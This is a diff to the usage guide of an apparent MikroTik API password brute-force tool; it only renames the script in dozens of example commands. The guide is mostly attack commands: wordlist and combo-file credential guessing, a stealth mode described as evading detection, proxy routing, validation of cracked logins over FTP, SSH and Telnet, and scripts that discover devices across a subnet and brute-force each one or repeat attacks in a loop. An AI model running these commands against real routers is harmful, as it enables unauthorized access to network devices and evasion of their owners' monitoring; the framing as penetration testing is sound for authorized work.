@@ -14,7 +14,7 @@
 
 ```bash
 # Teste básico com usuário e senha únicos
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -U admin -P 123456
+python mikrotikapi-bf.py -t 192.168.1.1 -U admin -P 123456
 ```
 
 Expected output:
@@ -32,7 +32,7 @@ Expected output:
 
 ```bash
 # Teste com wordlists de usuários e senhas
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u wordlists/users.lst -p wordlists/passwords.lst
+python mikrotikapi-bf.py -t 192.168.1.1 -u wordlists/users.lst -p wordlists/passwords.lst
 ```
 
 Wordlists structure:
@@ -56,7 +56,7 @@ mikrotik
 
 ```bash
 # Teste com arquivo combo (user:pass)
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -d wordlists/combo.lst
+python mikrotikapi-bf.py -t 192.168.1.1 -d wordlists/combo.lst
 ```
 
 Combo file format:
@@ -72,7 +72,7 @@ root:12345
 
 ```bash
 # Teste com validação pós-login
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --validate ftp,ssh,telnet
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --validate ftp,ssh,telnet
 ```
 
 Expected output:
@@ -90,7 +90,7 @@ Expected output:
 
 ```bash
 # Teste com stealth mode ativado
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --stealth --threads 1
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --stealth --threads 1
 ```
 
 Features:
@@ -102,7 +102,7 @@ Features:
 
 ```bash
 # Teste com fingerprinting do dispositivo
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 --fingerprint
+python mikrotikapi-bf.py -t 192.168.1.1 --fingerprint
 ```
 
 Sample output:
@@ -121,7 +121,7 @@ Sample output:
 
 ```bash
 # Teste com barra de progresso
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --progress
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --progress
 ```
 
 Sample output:
@@ -134,7 +134,7 @@ ETA: 00:02:30 | Speed: 3.3 attempts/sec | Success: 2
 
 ```bash
 # Teste com exportação em todos os formatos
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --export-all
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --export-all
 ```
 
 Generated files:
@@ -150,10 +150,10 @@ results/
 
 ```bash
 # Teste com proxy SOCKS5
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --proxy socks5://127.0.0.1:1080
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --proxy socks5://127.0.0.1:1080
 
 # Teste com proxy HTTP
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --proxy http://user:pass@proxy.example.com:8080
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --proxy http://user:pass@proxy.example.com:8080
 ```
 
 ## 🎯 Pentesting Scenarios
@@ -162,7 +162,7 @@ python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --p
 
 ```bash
 # Pentest completo com todos os recursos
-python mikrotikapi-bf-v3.6.0.py \
+python mikrotikapi-bf.py \
   -t 192.168.1.1 \
   -u wordlists/users.lst \
   -p wordlists/passwords.lst \
@@ -186,16 +186,16 @@ python mikrotik-discovery.py --cidr 192.168.1.0/24 --threads 10 --export json
 
 ```bash
 # Criar nova sessão
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --force
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --force
 
 # Continuar sessão existente
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 --resume
+python mikrotikapi-bf.py -t 192.168.1.1 --resume
 
 # Listar sessões
-python mikrotikapi-bf-v3.6.0.py --list-sessions
+python mikrotikapi-bf.py --list-sessions
 
 # Ver informações de sessão
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 --session-info
+python mikrotikapi-bf.py -t 192.168.1.1 --session-info
 ```
 
 ### 4. Smart Wordlists
@@ -217,7 +217,7 @@ print(f'Generated {len(combinations)} combinations')
 
 ```bash
 # Teste com portas customizadas
-python mikrotikapi-bf-v3.6.0.py \
+python mikrotikapi-bf.py \
   -t 192.168.1.1 \
   -u users.lst \
   -p passwords.lst \
@@ -232,7 +232,7 @@ python mikrotikapi-bf-v3.6.0.py \
 
 ```bash
 # Teste com configurações de retry
-python mikrotikapi-bf-v3.6.0.py \
+python mikrotikapi-bf.py \
   -t 192.168.1.1 \
   -u users.lst \
   -p passwords.lst \
@@ -244,13 +244,13 @@ python mikrotikapi-bf-v3.6.0.py \
 
 ```bash
 # Teste com verbosidade normal
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst
 
 # Teste com verbosidade alta
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst -v
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst -v
 
 # Teste com debug completo
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst -vv
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst -vv
 ```
 
 ### 4. YAML Configuration
@@ -274,7 +274,7 @@ verbose: true
 
 ```bash
 # Usar configuração YAML
-python mikrotikapi-bf-v3.6.0.py --config config.yaml
+python mikrotikapi-bf.py --config config.yaml
 ```
 
 ## 🔍 Sample Outputs
@@ -405,7 +405,7 @@ Target: 192.168.1.1
 ping 192.168.1.1
 
 # Testar com timeout maior
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -U admin -P 123456 --timeout 30
+python mikrotikapi-bf.py -t 192.168.1.1 -U admin -P 123456 --timeout 30
 ```
 
 ### 2. Issue: Missing modules
@@ -423,7 +423,7 @@ pip install --force-reinstall -r requirements.txt
 
 ```bash
 # Linux/macOS
-chmod +x mikrotikapi-bf-v3.6.0.py
+chmod +x mikrotikapi-bf.py
 
 # Windows
 # Executar PowerShell como Administrador
@@ -446,7 +446,7 @@ set PYTHONIOENCODING=utf-8
 rm -rf sessions/*.json
 
 # Criar nova sessão
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --force
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --force
 ```
 
 ## 📚 Example Scripts
@@ -462,7 +462,7 @@ USERLIST="wordlists/users.lst"
 PASSLIST="wordlists/passwords.lst"
 
 echo "Starting automated test..."
-python mikrotikapi-bf-v3.6.0.py \
+python mikrotikapi-bf.py \
   -t $TARGET \
   -u $USERLIST \
   -p $PASSLIST \
@@ -493,7 +493,7 @@ python mikrotik-discovery.py --cidr $NETWORK --threads 20 --export json
 echo "Starting mass brute force..."
 for ip in $(cat results/discovered_mikrotik_devices.json | jq -r '.devices[].ip'); do
   echo "Testing $ip..."
-  python mikrotikapi-bf-v3.6.0.py \
+  python mikrotikapi-bf.py \
     -t $ip \
     -u $USERLIST \
     -p $PASSLIST \
@@ -516,7 +516,7 @@ INTERVAL=300  # 5 minutes
 
 while true; do
   echo "Testing $TARGET at $(date)"
-  python mikrotikapi-bf-v3.6.0.py \
+  python mikrotikapi-bf.py \
     -t $TARGET \
     -u wordlists/users.lst \
     -p wordlists/passwords.lst \
@@ -535,43 +535,43 @@ done
 
 ```bash
 # Usar threads adequadas (máximo 15)
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --threads 10
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --threads 10
 
 # Usar stealth mode para evitar detecção
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --stealth
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --stealth
 
 # Usar sessões para continuidade
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --resume
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --resume
 ```
 
 ### 2. Configuração de Wordlists
 
 ```bash
 # Usar wordlists específicas para Mikrotik
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u wordlists/mikrotik_users.lst -p wordlists/mikrotik_passwords.lst
+python mikrotikapi-bf.py -t 192.168.1.1 -u wordlists/mikrotik_users.lst -p wordlists/mikrotik_passwords.lst
 
 # Usar wordlists brasileiras
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u wordlists/username_br.lst -p wordlists/labs_passwords.lst
+python mikrotikapi-bf.py -t 192.168.1.1 -u wordlists/username_br.lst -p wordlists/labs_passwords.lst
 ```
 
 ### 3. Configuração de Exportação
 
 ```bash
 # Exportar apenas JSON
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --export json
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --export json
 
 # Exportar para diretório específico
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --export-all --export-dir reports/
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --export-all --export-dir reports/
 ```
 
 ### 4. Configuração de Validação
 
 ```bash
 # Validar apenas FTP
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --validate ftp
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --validate ftp
 
 # Validar com portas customizadas
-python mikrotikapi-bf-v3.6.0.py -t 192.168.1.1 -u users.lst -p passwords.lst --validate ftp=2121,ssh=2222
+python mikrotikapi-bf.py -t 192.168.1.1 -u users.lst -p passwords.lst --validate ftp=2121,ssh=2222
 ```
 
 ## 📞 Suporte
@@ -582,4 +582,5 @@ Para mais exemplos e suporte:
 - **Documentação**: `docs/README.md`
 - **Issues**: GitHub Issues
 - **LinkedIn**: https://www.linkedin.com/in/mrhenrike
+
 
